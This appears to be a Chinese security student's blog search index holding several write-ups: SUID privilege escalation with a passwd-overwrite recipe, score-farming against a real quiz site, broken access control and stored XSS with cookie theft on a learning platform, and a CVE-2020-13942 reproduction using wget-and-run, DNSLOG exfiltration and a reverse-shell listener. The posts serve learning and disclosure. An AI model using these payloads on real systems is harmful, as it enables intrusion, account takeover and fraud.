<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>test</title>
    <url>/2021/03/17/test/</url>
    <content><![CDATA[<p>测试测试这个怎么写啊！！！</p>
]]></content>
  </entry>
  <entry>
    <title>随便写点</title>
    <url>/2021/03/20/%E9%9A%8F%E4%BE%BF%E5%86%99%E7%82%B9/</url>
    <content><![CDATA[<p>开设博客主要是想分享一下日常学习中的一些记录，激励自己一直学下去。<br>当然啦，目前还没学到一种比较深的层次，博文质量应该也不会好到哪里去。。。。。。<br>不知道自己会坚持写多久，不知道有没有人会看。<br>总知希望自己在学习安全的道路上一直坚持下去吧。<br><img src="/images/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/11.jpg" alt="1" title="1"></p>
]]></content>
  </entry>
  <entry>
    <title>4000厂商默认密码</title>
    <url>/2021/03/20/4000s%E5%8E%82%E5%95%86%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>之前就看到了，后来这几天看到一些公众号发点进去已经被封了，所以保存了一下，有需要可以下载。</p>
<blockquote>
<p>链接：<a href="https://pan.baidu.com/s/1YCDM2zFWwLbRrTxYXXmC6Q">https://pan.baidu.com/s/1YCDM2zFWwLbRrTxYXXmC6Q</a><br>提取码：oejb </p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>蓝桥楼赛25期第三题WP</title>
    <url>/2021/03/20/%E8%93%9D%E6%A1%A5%E6%A5%BC%E8%B5%9B25%E6%9C%9F%E7%AC%AC%E4%B8%89%E9%A2%98WP/</url>
    <content><![CDATA[<h1 id="蓝桥楼赛25期第三题-WP"><a href="#蓝桥楼赛25期第三题-WP" class="headerlink" title="蓝桥楼赛25期第三题 WP"></a>蓝桥楼赛25期第三题 WP</h1><h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p><img src="/images/lanqiaowp/Untitled.png" alt="/images/lanqiaowp/Untitled.png"></p>
<p>具体干了些啥 也不知道</p>
<p>首先  用户给你切换了  然后有个groups的无法找到组的提示 </p>
<p>首先应该查询下这个用户的一些相关信息</p>
<p>当用alice账户进行创建文件等操作发现都没法创建 说名权限给的是蛮低的</p>
<p>然后继续观察会发现 /home 下面还多出了 yann的用户  说明环境布置时还多加了一个yann的用户 具体干啥也不知道 目前没有任何用户密码 所以也没法使用su 进行切换 </p>
<p>下面可以顺便留意下组  </p>
<p>cat /etc/group</p>
<p>发现多出来了个yann组  暂且留意</p>
<p>由于文件在root文件夹权限不够 所以要进行提权 </p>
<p>下面开始提权</p>
<p>百度一下  发现几种 提权方式</p>
<ul>
<li>内核漏洞</li>
<li>以root身份运行的程序</li>
<li>已安装的软件</li>
<li>弱密码/重用密码/纯文本密码</li>
<li>内部服务</li>
<li>Suid配置错误</li>
<li>滥用sudo权利</li>
<li>由root调用的可写脚本</li>
<li>路径配置错误</li>
<li>Cronjobs</li>
<li>卸载的文件系统</li>
</ul>
<p>由于本次主要是suid提权 这次从suid提起 </p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权 限。在 Linux/Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。 SUID被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文 件。简而言之用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有 者的UID和GID</p>
<p>简单来说。<strong>suid，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</strong></p>
<p>也就是说如果出现root用户配置错了suid文件的情况 我们就能借助root的身份来执行这些suid配置错误的文件 而不需要切换到root</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span></span><br><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line">find / -user root -perm <span class="number">-4000</span>-print2&gt;/dev/<span class="literal">null</span></span><br><span class="line">find / -user root -perm <span class="number">-4000</span>-exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>目前已知的一些用于suid提权的文件</p>
<ul>
<li>nmap</li>
<li>vim</li>
<li>find</li>
<li>bash</li>
<li>more</li>
<li>less</li>
<li>nano</li>
<li>cp</li>
</ul>
<p>方法：<a href="https://www.jianshu.com/p/5ac4602b14c6">https://www.jianshu.com/p/5ac4602b14c6</a></p>
<h1 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h1><p>通过上文给出的命令查找具有root权限的suid文件</p>
<p><img src="/images/lanqiaowp/Untitled%201.png" alt="/images/lanqiaowp/Untitled%201.png"></p>
<p>不难发现 有个CP出来了</p>
<p>CP 是复制文件用的  </p>
<p>那CP提权的方法可以是复制一个提前构造好的passwd（添加了一个root权限的用户）文件来覆盖系统中原有的passwd文件 然后切换到刚才添加的用户就提权成功了</p>
<p>而根据题目的要求  我们也可以直接用CP来吧/root/flag来复制到其他我们有权限访问的文件夹下</p>
<p>那我们先直接CD到 suid配置错误的文件目录下</p>
<p><img src="/images/lanqiaowp/Untitled%202.png" alt="/images/lanqiaowp/Untitled%202.png"></p>
<p>使用CP进行一次尝试</p>
<p><img src="/images/lanqiaowp/Untitled%203.png" alt="/images/lanqiaowp/Untitled%203.png"></p>
<p>它会提示我们权限不够 这似乎与上文提到的suid提权原理背道而驰  </p>
<p>但其实不是   </p>
<p>其实这里不妨使用ls -l 看一下</p>
<p><img src="/images/lanqiaowp/Untitled%204.png" alt="/images/lanqiaowp/Untitled%204.png"></p>
<p><img src="/images/lanqiaowp/Untitled%205.png" alt="/images/lanqiaowp/Untitled%205.png"></p>
<p>前面部分对照下上面提供的表   后面的root yann 分别是文件所属的用户 和文件所属组</p>
<p>可以看到此文件的拥有者是root  所属组是yann （该组用户有执行权限）其他用户没有任何权限  也就是说我们当前用户alice 是没有办法执行这个文件的  </p>
<p>那当前的思路可以是</p>
<ul>
<li>将alice加入yann组</li>
<li>更改文件的所属组</li>
<li>切换到yann组中的用户（yann）</li>
</ul>
<p>但是很快会发现  前面两个思路需要很大的权限  而操作者 alice 没有这么大的权限  故 PASS</p>
<p>而第三个 切换到yann这个用户需要yann的密码我们这边也没有  </p>
<p>怎么办呢 。。。</p>
<p>没办法。。。。。。</p>
<p>这个时候就是扯的地方。。。。其实他初始化环境的时候还给系统WWW文件夹下加了个 discuz论坛的文件 </p>
<p>这边 他其实把系统的账户密码存在了数据库里  数据库的账号密码可以去Discuz里的数据库配置文件里去拿</p>
<p><img src="/images/lanqiaowp/Untitled%206.png" alt="/images/lanqiaowp/Untitled%206.png"></p>
<p><img src="/images/lanqiaowp/Untitled%207.png" alt="/images/lanqiaowp/Untitled%207.png"></p>
<p>这个时候直接去mysql里去拿</p>
<p><img src="/images/lanqiaowp/Untitled%208.png" alt="/images/lanqiaowp/Untitled%208.png"></p>
<p><img src="/images/lanqiaowp/Untitled%209.png" alt="/images/lanqiaowp/Untitled%209.png"></p>
<p><img src="/images/lanqiaowp/Untitled%2010.png" alt="/images/lanqiaowp/Untitled%2010.png"></p>
<p>这个时候里面就有yann的密码。。。。。。。。。。。</p>
<p>然后我们可以尝试切换到yann用户去执行只有yann组内成员才有执行权限的CP文件</p>
<p><img src="/images/lanqiaowp/Untitled%2011.png" alt="/images/lanqiaowp/Untitled%2011.png"></p>
<p>这边就切过去了</p>
<p>这会我们再去用CP试试</p>
<p><img src="/images/lanqiaowp/Untitled%2012.png" alt="/images/lanqiaowp/Untitled%2012.png"></p>
<p>这个时候或许有人发现还是权限不够 </p>
<p>其实这个时候要知道 LINUX里的默认CP命令是 /bin/ 底下的文件 可以类比windows的环境变量  而存在SUID配置错误的是 /var/local/backup/ 下的CP文件  </p>
<p><strong>bin为binary的简写，主要放置系统的必备执行文件，例如 cat cp chmod df dmesg gzip ls kill mkdir su 等</strong></p>
<p><img src="/images/lanqiaowp/Untitled%2013.png" alt="/images/lanqiaowp/Untitled%2013.png"></p>
<p>只要这样让他执行该目录下的cp 就可以复制成功了</p>
<p><img src="/images/lanqiaowp/Untitled%2014.png" alt="/images/lanqiaowp/Untitled%2014.png"></p>
<h1 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h1><p>覆盖psswd文件提权为root</p>
<p>复制一份passwd→添加新账户→覆盖原有passwd</p>
<p>由于alice账户没有创建文件的权限 这边可以在桌面模式下新开一个终端 会回到shiyanlou账户</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd &gt; passwd      </span><br><span class="line">openssl passwd <span class="number">-1</span> -salt vxeroad vxeroad123</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;vxeroad:$1$vxeroad$LMTNFD4f5SV.Rsk1qNnHE0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; passwd</span><br><span class="line">cp passwd /etc/passwd</span><br><span class="line">su - vxeroad</span><br><span class="line">id</span><br><span class="line"><span class="comment">//摘自网络</span></span><br></pre></td></tr></table></figure>

<p>但由于账户权限  其实上述代码执行时还是有些地方没法执行 比如第一步就没法写入  这个时候可以手动复制 也可使用cp命令直接复制过去</p>
<p>对于passwd文件中的各参数意义</p>
<p>没行记录各个数据段用 ：来进行分离</p>
<p><strong>注册名：口令：用户标识号：组标识号：用户名：用户主目录：命令解释程序</strong></p>
<p>vxeroad:$1$vxeroad$LMTNFD4f5SV.Rsk1qNnHE0:0:0::/root/:/bin/bash</p>
<ul>
<li>用户主目录(home_directory)：该字段定义了个人用户的主目录，当用户登录后，他的Shell将把该目录作为用户的工作目录。 在Unix/Linux系统中，超级用户root的工作目录为/root；而其它个人用户在/home目录下均有自己独立的工作环境，系统在该目录下为每 个用户配置了自己的主目录。个人用户的文件都放置在各自的</li>
</ul>
<p><img src="/images/lanqiaowp/Untitled%2015.png" alt="/images/lanqiaowp/Untitled%2015.png"></p>
<p><img src="/images/lanqiaowp/Untitled%2016.png" alt="/images/lanqiaowp/Untitled%2016.png"></p>
<p><img src="/images/lanqiaowp/Untitled%2017.png" alt="/images/lanqiaowp/Untitled%2017.png"></p>
<p><img src="/images/lanqiaowp/Untitled%2018.png" alt="/images/lanqiaowp/Untitled%2018.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次主要还是针对suid的一次提权实操。难点在于发现当前使用的用户不在CP文件的所属组 故纵使suid配置错误 也是无法进行利用的 所以以后进行suid提权时还是有必要ls -l 列出文件的一些相关属性的查看的。</p>
]]></content>
  </entry>
  <entry>
    <title>中国大学生在线某活动刷分漏洞分析及脚本实现</title>
    <url>/2021/03/20/%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%9C%A8%E7%BA%BF%E6%9F%90%E6%B4%BB%E5%8A%A8%E5%88%B7%E5%88%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>当初朋友学校要搞这活动，说排行榜上全是刷分大佬，让我来看看。我一听，啪的一下很快啊，第一时间拿到站分析了一下。（号已经没了）</p>
<p>登录时抓取获取token包，此包可以进行重放(没修复)</p>
<p><a href="http://ssxx.univs.cn/clientLogin?redirect=/client/detail/5f71e934bcdbf3a8c3ba5061">http://ssxx.univs.cn/clientLogin?redirect=%2Fclient%2Fdetail%2F5f71e934bcdbf3a8c3ba5061</a></p>
<p>一场答题的正常流程</p>
<p><img src="/images/si_shi_shua_fen/si_shi_shua_fen.png" alt="/images/si_shi_shua_fen.png"></p>
<p>发送  开始答题 包  →返回底下测试时将要出现的题目ID和本次答题的答题ID</p>
<p><img src="/images/si_shi_shua_fen/Untitled.png" alt="/images/si_shi_shua_fen/Untitled.png"></p>
<p>然后前端继续从刚才返回的题目ID中逐一发送请求题目的（获取题目内容）包 返回当前题目的详细内容 通过GTE请求的方式传输  刚才返回的ID会被带上请求</p>
<p><img src="/images/si_shi_shua_fen/Untitled%201.png" alt="/images/si_shi_shua_fen/Untitled%201.png"></p>
<p>答题包</p>
<p>POST请求  传入刚才的题目ID 和答案ID  若错误会返回正确的答案ID</p>
<p>漏洞修复前 ：传入的题目ID不是之前开始答题返回包里的题目ID也是可以的</p>
<p>修复后：会判断题目ID是否在开始答题返回的题目库中 不在则会被拒绝</p>
<p><img src="/images/si_shi_shua_fen/Untitled%202.png" alt="/images/si_shi_shua_fen/Untitled%202.png"></p>
<p>答题结束包</p>
<p>将第一个包的RACE ID post出去 返回获得的积分</p>
<p>漏洞修复后—-加入了时间检测</p>
<p><img src="/images/si_shi_shua_fen/Untitled%203.png" alt="/images/si_shi_shua_fen/Untitled%203.png"></p>
<p>几个参数</p>
<ul>
<li>t ——UNIX时间戳   （漏洞修补后开始答题和结束答题包发的太快会返回答题太快的包拒绝，联想到会不会服务器将服务器的时间戳和开始时的时间戳进行比较来判断答题时间的。试验后发现并不是。。好像没多大用）</li>
<li>activity_id———可能是用户标识</li>
<li>mode_id————选择的答题的类型（有几大答题板块）</li>
<li>way———-暂时不知道</li>
<li>question_id———-题目ID（题目ID和答案ID都是不变的）</li>
<li>answer————-答案ID</li>
</ul>
<h2 id="漏洞修复前的自动化刷分方案"><a href="#漏洞修复前的自动化刷分方案" class="headerlink" title="漏洞修复前的自动化刷分方案"></a>漏洞修复前的自动化刷分方案</h2><p><img src="/images/si_shi_shua_fen/QQ20201122101700.png" alt="/images/si_shi_shua_fen/QQ20201122101700.png"></p>
<p>可以先用开始答题的包（返回题目ID）配合答题的包（返回正确答案）</p>
<p>自动化思路</p>
<h3 id="在这之前"><a href="#在这之前" class="headerlink" title="在这之前"></a>在这之前</h3><p> 之前每次刷三四个小时 用户token会自动过期 这个网站的登录本质上是每次发包都带上Authorization头中的内容（一种用户凭证给服务器识别用户的）</p>
<p><img src="/images/si_shi_shua_fen/Untitled%204.png" alt="/images/si_shi_shua_fen/Untitled%204.png"></p>
<p> 可以是用一开始登录时用户的包发送可以继续自动登录永不掉线刷下去</p>
<p>1</p>
<p>发送开始答题包（将获取的RACE_id存入变量供结束包使用）</p>
<p>获取题目包</p>
<p>答题包</p>
<p>结束包</p>
<hr>
<p>加一分要发四个四个包</p>
<p>2</p>
<p>建立一个题库字典</p>
<p>让程序循环执行</p>
<pre><code>发开始包（从中获取race_id存入变量）

    （红色的字部分从题库反复遍历答完题库中所有题目）

     获取题目包

     答题包

结束包（将开始的race_id放入包中发出）
</code></pre>
<hr>
<p>相比1程序 每加一个积分都要要少发开始和结束race 的包</p>
<p>3</p>
<p>多线程 </p>
<p>注意到不同的MODE_ID之间答题互不干扰，是相互独立存在的</p>
<p>可以让程序同时答这几个大专题的题目</p>
<p>建立五个线程</p>
<p>每个线程类似于2中写的程序  只是modeID改变</p>
<hr>
<p>这个蛮快的</p>
<hr>
<p>脚本实现截图</p>
<p><img src="/images/si_shi_shua_fen/20201121_212126.jpg" alt="/images/si_shi_shua_fen/20201121_212126.jpg"></p>
]]></content>
  </entry>
  <entry>
    <title>学习通越权上传+XSS组合拳</title>
    <url>/2021/03/20/%E5%AD%A6%E4%B9%A0%E9%80%9A%E8%B6%8A%E6%9D%83%E4%B8%8A%E4%BC%A0-XSS%E7%BB%84%E5%90%88%E6%8B%B3/</url>
    <content><![CDATA[<p>这个主要是寒假回来要上网课无聊挖的</p>
<h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><h2 id="1-课程系统资料处"><a href="#1-课程系统资料处" class="headerlink" title="1.课程系统资料处"></a>1.课程系统资料处</h2><p>首先在<strong>自己的账户</strong>创建一个课程 ，进入自己课程的资料上传界面，点击本地上传，如图2</p>
<p><img src="/images/xue_xi_tong_1/Untitled.png" alt="/images/xue_xi_tong_1/Untitled.png"></p>
<h2 id="2-选择一个资源文件夹，对文件夹进行重命名"><a href="#2-选择一个资源文件夹，对文件夹进行重命名" class="headerlink" title="2.选择一个资源文件夹，对文件夹进行重命名"></a>2.选择一个资源文件夹，对文件夹进行重命名</h2><p>使用burp对重命名操作进行抓包，发现是一个post型的操作，对其数据包参数进行分析可知</p>
<ul>
<li>courseid为课程id  一个课程对应一个id（如重说《中国近代纲要》对应courseid=206203637）</li>
<li>dataid 为课程中的资源id</li>
<li>dataname 修改后的资源名  如下图</li>
</ul>
<p><img src="/images/xue_xi_tong_1/450OL6R88AAT(W)FQJ4J.png" alt="/images/xue_xi_tong_1/450OL6R88AAT(W)FQJ4J.png"></p>
<p>看 POST参数  可知  courseid 为课程id  dataid 是要修改资源的id  dataname是要修改的名字</p>
<h2 id="3-然后进入其他课程，获取其他课程id"><a href="#3-然后进入其他课程，获取其他课程id" class="headerlink" title="3.然后进入其他课程，获取其他课程id"></a>3.然后进入其他课程，获取其他课程id</h2><p>如图，这里我们选择进入学校网课期间的《中国近代史纲要》课程作为漏洞攻击案例</p>
<p>点击要更改的文件抓包，在请求包中可以获得《中国近代史纲要》的courseid，dataid，dataname  等相关参数（后面我们需要用到）</p>
<p><strong>下图2中可得《中国近代史纲要》courseid dataid</strong></p>
<p><img src="/images/xue_xi_tong_1/_GNX" alt="/images/xue_xi_tong_1/_GNX)X)2LF2DEQ286.png">X)2LF2DEQ286.png)</p>
<p><img src="/images/xue_xi_tong_1/Untitled%201.png" alt="/images/xue_xi_tong_1/Untitled%201.png"></p>
<h2 id="4-修改重命名请求包参数"><a href="#4-修改重命名请求包参数" class="headerlink" title="4.修改重命名请求包参数"></a>4.修改重命名请求包参数</h2><p>将之前的重命名请求包中的courseid，dataid参数替换成《中国近代史纲要》的courseid，dataid，因为我们要修改《中国近代史纲要》中的资源内容，所以需要将原来数据包中的courseid，dataid参数修改《中国近代史纲要》的courseid，dataid参数</p>
<p><strong>dataname</strong>  为重命名后的资源名，dataname改成什么，资源的名字就会被修改成什么</p>
<p>这里我们将<strong>dataname=test，（dataname=欢迎加入滨江网安协会，这是一个越权漏洞）</strong>放行篡改后的数据包，结果如下图</p>
<p><img src="/images/xue_xi_tong_1/QM" alt="/images/xue_xi_tong_1/QM)3G6A0VJPRDBWBK7.png">3G6A0VJPRDBWBK7.png)</p>
<p>可见文件夹已经更名成功，《中国近代史纲要》课程下多出一个<strong>欢迎加入滨江网安协会，这是一个越权漏洞文件 和 test文件夹</strong></p>
<h2 id="5-同理，抓取文件上传的请求包"><a href="#5-同理，抓取文件上传的请求包" class="headerlink" title="5.同理，抓取文件上传的请求包"></a>5.同理，抓取文件上传的请求包</h2><p>添加文件到资料包</p>
<p>抓取想要上传的其他课程数据</p>
<p>更改添加文件到资料包 中的数据 即可将任意文件上传到任意课程的文件夹中</p>
<p><img src="/images/xue_xi_tong_1/Untitled%202.png" alt="/images/xue_xi_tong_1/Untitled%202.png"></p>
<p><img src="/images/xue_xi_tong_1/Untitled%203.png" alt="/images/xue_xi_tong_1/Untitled%203.png"></p>
<p>上传成功，结果如下图</p>
<p><img src="/images/xue_xi_tong_1/Untitled%204.png" alt="/images/xue_xi_tong_1/Untitled%204.png"></p>
<hr>
<p>当然这边除了重命名文件上传还有其他的越权点。</p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>（学习通XSS好像还蛮多的）</p>
<h2 id="1-抓取文件上传数据包"><a href="#1-抓取文件上传数据包" class="headerlink" title="1.抓取文件上传数据包"></a>1.抓取文件上传数据包</h2><p>进入文件上传处 抓取文件上传的包，上传文件的数据包如下图，上传文件为post型数据包，其中的jsondata为漏洞触发点，该段数据采用了URL编码加密。</p>
<p><img src="/images/xue_xi_tong_1/Untitled%205.png" alt="/images/xue_xi_tong_1/Untitled%205.png"></p>
<h2 id="2-jsondata数据解码"><a href="#2-jsondata数据解码" class="headerlink" title="2.jsondata数据解码"></a>2.jsondata数据解码</h2><p>将上图中jsondata加密数据解码后得到如下Json内容，</p>
<p>漏洞位置 ：datasize处 （解码后数据）</p>
<p>这边试过更改好多地方 发现其他地方改都被过滤掉了，后来发现文件大小那一栏没有怎么做过滤。果断一梭子。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;courseId&quot;</span>:<span class="string">&quot;216777036&quot;</span>,<span class="string">&quot;rootId&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;dataName&quot;</span>:<span class="string">&quot;123.png&quot;</span>,</span><br><span class="line"><span class="string">&quot;source&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;dataSize&quot;</span>:<span class="string">&quot;999PB&quot;</span>,<span class="string">&quot;dataType&quot;</span>:<span class="string">&quot;png&quot;</span>,<span class="string">&quot;objectId&quot;</span>:</span><br><span class="line"><span class="string">&quot;c11ba64e739aa87d231dbbccf9403de8&quot;</span>,<span class="string">&quot;courseName&quot;</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">æ°æ®ç»æ&quot;</span>,<span class="string">&quot;isOpen&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;dataRealType&quot;</span>:<span class="string">&quot;ppt&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<h2 id="3-构造XSS攻击代码"><a href="#3-构造XSS攻击代码" class="headerlink" title="3.构造XSS攻击代码"></a>3.构造XSS攻击代码</h2><p>将datasize的内容替换为xss攻击语句（对比上下图可知999PB被替换成了&lt;input//onmouseover= &quot;window<a href="1">‘al’+’ert’</a>&quot;&gt;）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;courseId&quot;</span>:<span class="string">&quot;216777036&quot;</span>,<span class="string">&quot;rootId&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;dataName&quot;</span>:<span class="string">&quot;123.png&quot;</span>,<span class="string">&quot;source&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line"><span class="string">&quot;dataSize&quot;</span>:<span class="string">&quot;&lt;input//onmouseover= \&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)\&quot;&gt;&quot;</span>,<span class="string">&quot;dataType&quot;</span>:<span class="string">&quot;png&quot;</span>,</span><br><span class="line"><span class="string">&quot;objectId&quot;</span>:<span class="string">&quot;c11ba64e739aa87d231dbbccf9403de8&quot;</span>,<span class="string">&quot;courseName&quot;</span>:<span class="string">&quot;æ°æ®ç»æ&quot;</span>,<span class="string">&quot;isOpen&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;dataRealType&quot;</span>:<span class="string">&quot;ppt&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>放行篡改后的数据包，发包上传文件，结果如下图</p>
<p>发现文件大小处已经变成了输入框  鼠标移动时触发了弹窗事件，攻击成功！</p>
<p><img src="/images/xue_xi_tong_1/Untitled%206.png" alt="/images/xue_xi_tong_1/Untitled%206.png"></p>
<h2 id="4-XSS漏洞危害再度扩大"><a href="#4-XSS漏洞危害再度扩大" class="headerlink" title="4.XSS漏洞危害再度扩大"></a>4.XSS漏洞危害再度扩大</h2><p>此时插入xss攻击代码可以获取被害者的cookie 进行 密码钓鱼 木马钓鱼下载 页面劫持等</p>
<p>获取到的cookie可以用来登录被害者的账号，如下图就属于攻击成功的案例，获取到了用户的cookie，后续，我们通过获取到的cookie凭证成功登录受害者的学习通账号</p>
<p><img src="/images/xue_xi_tong_1/Untitled%207.png" alt="/images/xue_xi_tong_1/Untitled%207.png"></p>
]]></content>
  </entry>
  <entry>
    <title>Apache Unomi远程代码执行漏洞（CVE-2020-13942）复现</title>
    <url>/2021/03/20/Apache-Unomi%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13942%EF%BC%89%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub+docker快速搭建</p>
<p><img src="/images/cve-2020-13942/Untitled.png" alt="/images/cve-2020-13942/Untitled.png"></p>
<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Apache Unomi是一个Java开源客户数据平台，这是一个Java服务器，旨在管理客户，潜在顾客和访问者的数据，并帮助个性化客户体验。Unomi可用于在非常不同的系统（例如CMS，CRM，问题跟踪器，本机移动应用程序等）中集成个性化和配置文件管理。</p>
<p>在Apache Unomi 1.5.1版本之前，攻击者可以通过构造的MVEL或ONGl表达式来发送恶意请求，使得Unomi服务器执行任意代码，漏洞对应编号为CVE-2020-11975，而CVE-2020-13942漏洞是对CVE-2020-11975漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。</p>
<p><strong>不过没有命令执行的回显</strong> </p>
<p><strong>这边可以尝试使用DNSLOG的方式获得回显</strong></p>
<p>原理：</p>
<p>域名分级</p>
<p>主机名.三级域名.二级域名.顶级域名</p>
<p><img src="/images/cve-2020-13942/Untitled%201.png" alt="/images/cve-2020-13942/Untitled%201.png"></p>
<p>DNS递归查询过程</p>
<p>查找<a href="http://www.example.com的IP地址的连锁反应：">www.example.com的IP地址的连锁反应：</a></p>
<p>用户计算机首先会查询该网站所使用的域名服务器（DNS服务器）。 这个过程就是图片中的“递归式域名服务器”。</p>
<p>DNS服务器不知道<a href="http://www.example.com的ip地址,因此dns服务器会开始进行连锁查询,直到查找到ip地址并向计算机报告./">www.example.com的IP地址，因此DNS服务器会开始进行连锁查询，直到查找到IP地址并向计算机报告。</a></p>
<p>1.在互联网根服务器中进行查找，获取顶级域名.com的DNS服务器。</p>
<p>2.在.com的顶级域名DNS服务器进行查找，获取example.com的授权DNS服务器。</p>
<p>3.在exapmle.com的授权DNS服务器中查找主机<a href="http://www.example.com的ip地址,最后将ip地址返回计算机/">www.example.com的IP地址，最后将IP地址返回计算机</a></p>
<p>4.大功告成！ 现在计算机获得了<a href="http://www.example.com的ip地址,用户可以访问该网站了./">www.example.com的IP地址，用户可以访问该网站了。</a></p>
<p>DNSLOG 生成的网址</p>
<p>随机字符.dnslog.cn</p>
<p><img src="/images/cve-2020-13942/Untitled%202.png" alt="/images/cve-2020-13942/Untitled%202.png"></p>
<p>当主机ping这个地址时（即对这个地址进行了fang） 这边就会产生记录</p>
<p><img src="/images/cve-2020-13942/Untitled%203.png" alt="/images/cve-2020-13942/Untitled%203.png"></p>
<p>反引号</p>
<p>Linux执行命令时会先将反引号中的内容当命令执行 回显的结果来替换反引号及其内容</p>
<p>所以若过让服务器ping <code>命令</code>.随机字符.dnslog.cn 那么DNSlog上就会记录下命令执行的结果</p>
<p>这种方式可以用在 SQL盲注 命令执行（无回显）等情况</p>
<h2 id="不反弹shell获取回显"><a href="#不反弹shell获取回显" class="headerlink" title="不反弹shell获取回显"></a>不反弹shell获取回显</h2><p>此处配合LINUX 的反引号 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">``</span><br><span class="line">e.g ping `whoami`<span class="number">.0</span>bufat.dnslog.cn</span><br><span class="line">在执行Ping 命令之前  会先执行反引号中的命令然后代入结果执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试构造POC为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(\<span class="string">&quot;ping `whoami`.0bufat.dnslog.cn\&quot;)  (省略)</span></span><br></pre></td></tr></table></figure>

<p>此时DNSlog处没有记录 很可能表示命令没有执行 也有可能是反引号被屏蔽</p>
<p>尝试创建一个用反引号执行命令后命名的文件</p>
<p>构造POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(\<span class="string">&quot;touch /tmp/`whoami`\&quot;) </span></span><br></pre></td></tr></table></figure>

<p>服务器上查看生成了这样的 可见可能是对反引号做了屏蔽</p>
<p><img src="/images/cve-2020-13942/Untitled%204.png" alt="/images/cve-2020-13942/Untitled%204.png"></p>
<p>换个思路 </p>
<p>通过wget上传已经写好的sh文件 然后命令执行 sh文件 </p>
<p>写好sh文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ping `whoami`.h0mvvx.dnslog.cn</span><br></pre></td></tr></table></figure>

<p>上传至服务器下载</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(\<span class="string">&quot;wget http://www.iframe.xyz/2.sh\&quot;)</span></span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(\<span class="string">&quot;sh 2.sh\&quot;)</span></span><br></pre></td></tr></table></figure>

<p>查看DNSLOG的记录</p>
<p><img src="/images/cve-2020-13942/Untitled%205.png" alt="/images/cve-2020-13942/Untitled%205.png"></p>
<p>命令成功被执行 同时反引号的内容被执行 whoami被执行返回root</p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>攻击端服务器设置一个监听端口</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/cve-2020-13942/Untitled%206.png" alt="/images/cve-2020-13942/Untitled%206.png"></p>
<p>尝试执行bash命令弹shell 但是400报错</p>
<p>网上复现时是可以直接反弹的这边不知道为什么</p>
<p><img src="/images/cve-2020-13942/Untitled%207.png" alt="/images/cve-2020-13942/Untitled%207.png"></p>
<p>调整思路下载sh文件执行</p>
<p><img src="/images/cve-2020-13942/Untitled%208.png" alt="/images/cve-2020-13942/Untitled%208.png"></p>
<p><img src="/images/cve-2020-13942/Untitled%209.png" alt="/images/cve-2020-13942/Untitled%209.png"></p>
<p> 但是此次执行监听端并没收到回弹的shell</p>
<p>服务器运行查询原因</p>
